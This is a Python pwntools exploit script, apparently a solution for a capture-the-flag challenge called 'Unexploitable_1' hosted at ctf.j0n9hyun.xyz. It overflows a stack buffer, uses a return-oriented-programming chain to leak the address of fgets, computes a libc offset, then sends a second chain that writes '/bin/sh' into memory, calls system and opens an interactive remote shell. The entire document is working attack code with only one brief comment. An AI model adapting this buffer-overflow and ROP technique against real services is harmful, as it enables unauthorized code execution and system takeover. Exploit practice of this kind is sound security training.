#!/usr/bin/python3
# bin: https://ctf.j0n9hyun.xyz/files/dd8c5e82fe2b268e59b029a0c46e1a52/Unexploitable_1

# csu init을 이용하면 input 길이를 넘어서서 안된다.

import sys
import code
from pwn import *

context.arch='amd64'

target = './Unexploitable_1'
p = remote('ctf.j0n9hyun.xyz',3023)
#p = process(target)
e = ELF(target)
rop = ROP(e)

print(p.recv())

system = e.plt['system']
fgets_got = e.got['fgets']
stdin = e.sym['stdin']
bss = 0x601060
sh = b'/bin/sh\x00'

buff_size = 0x18

rop.raw(b'a'*buff_size)
rop.call('system',[fgets_got])
rop.call('main',[])
print('-] first payload')
p.sendline(rop.chain())

print(p.recv())
fgets_addr = unpack(p.recvuntil(':')[:-1], 'all', endian='little')
write_addr = fgets_addr+0x8ba20
print('fgets_addr: ', hex(fgets_addr))
print('write_addr: ', hex(write_addr))

e.sym['write'] = write_addr
rop = ROP(e)
rop.raw(b'a'*buff_size)
rop.call('write',[0,bss,8])
rop.call('system',[bss])
print('=] second payload')
p.sendline(rop.chain())

p.sendline(b'/bin/sh\x00')

p.interactive()
